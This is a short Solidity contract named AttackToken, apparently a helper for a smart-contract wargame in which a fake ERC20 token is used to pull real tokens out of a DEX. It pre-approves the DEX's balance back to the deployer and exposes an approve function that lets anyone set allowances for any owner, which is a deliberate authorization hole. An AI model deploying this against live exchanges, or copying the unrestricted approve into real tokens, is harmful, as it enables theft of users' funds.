// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "openzeppelin/token/ERC20/ERC20.sol";

contract AttackToken is ERC20 {
    address private _dex;
    address public owner;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        owner = msg.sender;
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
        _approve(dexInstance, msg.sender, initialSupply); // we can get back tokens from the dex
    }

    function approve(address _owner, address spender, uint256 amount) public {
        require(_owner != _dex, "InvalidApprover");
        super._approve(_owner, spender, amount);
    }
}
